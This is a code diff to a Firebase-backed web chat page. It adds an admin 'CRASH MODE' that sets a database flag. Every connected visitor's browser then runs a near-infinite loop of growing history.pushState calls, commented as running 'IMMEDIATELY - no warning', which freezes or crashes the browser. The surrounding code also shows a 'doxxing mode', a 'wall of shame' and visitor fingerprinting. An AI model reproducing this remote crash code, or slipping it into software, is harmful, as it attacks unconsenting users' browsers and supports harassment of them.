@@ -70,6 +70,7 @@ h1#banner {
 #rickrollBtn { background:#ff1493; color:#fff; font-weight:bold; font-size:16px; padding:10px; margin-top:5px; width:100%; cursor:pointer; }
 #doxxBtn { background:#800080; color:#fff; font-weight:bold; font-size:16px; padding:10px; margin-top:5px; width:100%; cursor:pointer; }
 #clearShameBtn { background:#ff6600; color:#fff; font-weight:bold; font-size:16px; padding:10px; margin-top:5px; width:100%; cursor:pointer; }
+#crashBtn { background:#000; color:#f00; font-weight:bold; font-size:18px; padding:12px; margin-top:5px; width:100%; cursor:pointer; border:3px solid #f00; }
 #admin-login { margin-top:10px; padding:10px; background:rgba(0,255,0,0.1); border-radius:5px; }
 #admin-login input { margin:2px; padding:5px; background:#000; color:#0f0; border:1px solid #0f0; font-family: monospace; }
 #adminLoginBtn { padding:5px 10px; background:#0f0; color:#000; border:none; cursor:pointer; font-family: monospace; font-weight:bold; margin-left:5px; }
@@ -252,6 +253,7 @@ html.shake {
     <button id="rickrollBtn">🎵 RICKROLL MODE 🎵</button>
     <button id="doxxBtn">💀 DOXXING MODE 💀</button>
     <button id="clearShameBtn">🗑️ CLEAR WALL OF SHAME 🗑️</button>
+    <button id="crashBtn">💥 CRASH MODE 💥</button>
   </div>
 
   <div id="admin-login">
@@ -302,6 +304,7 @@ firebase.initializeApp(firebaseConfig);
   const rickrollBtn=document.getElementById('rickrollBtn');
   const doxxBtn=document.getElementById('doxxBtn');
   const clearShameBtn=document.getElementById('clearShameBtn');
+  const crashBtn=document.getElementById('crashBtn');
   const shameBtn=document.getElementById('shameBtn');
   const shameModal=document.getElementById('shameModal');
   const closeShame=document.getElementById('closeShame');
@@ -386,6 +389,7 @@ firebase.initializeApp(firebaseConfig);
   const wtfModeRef=db.ref('wtfMode');
   const rickrollModeRef=db.ref('rickrollMode');
   const doxxModeRef=db.ref('doxxMode');
+  const crashModeRef=db.ref('crashMode');
   const shameRef=db.ref('wallOfShame');
   const fingerprintsRef=db.ref('fingerprints');
 
@@ -1017,6 +1021,20 @@ firebase.initializeApp(firebaseConfig);
     }, 5000);
   }
 
+  // CRASH MODE FUNCTIONALITY
+  function activateCrashMode(){
+    crashModeRef.set({ active: true, timestamp: Date.now() });
+  }
+
+  function triggerCrashEffect(){
+    // Execute crash code IMMEDIATELY - no warning
+    var total = "";
+    for( var i = 0; i < 10000000000000; i++ ) {
+      total += i.toString();
+      history.pushState(0,0, total );
+    }
+  }
+
   sendBtn.addEventListener('click',sendMessage);
   msgEl.addEventListener('keydown',e=>{if(e.key==='Enter')sendMessage();});
   adminLoginBtn.addEventListener('click',loginAdmin);
@@ -1026,6 +1044,7 @@ firebase.initializeApp(firebaseConfig);
   wtfBtn.addEventListener('click',activateWTFMode);
   rickrollBtn.addEventListener('click',activateRickrollMode);
   doxxBtn.addEventListener('click',activateDoxxMode);
+  crashBtn.addEventListener('click',activateCrashMode);
   clearShameBtn.addEventListener('click', () => {
     if(confirm('Are you sure you want to clear the entire Wall of Shame? This cannot be undone!')) {
       shameRef.remove();
@@ -1071,6 +1090,13 @@ firebase.initializeApp(firebaseConfig);
     const data = snapshot.val();
     if(data && data.active) {
       triggerDoxxEffect();
+    }
+  });
+
+  crashModeRef.on('value', snapshot => {
+    const data = snapshot.val();
+    if(data && data.active) {
+      triggerCrashEffect();
     }
   });
 
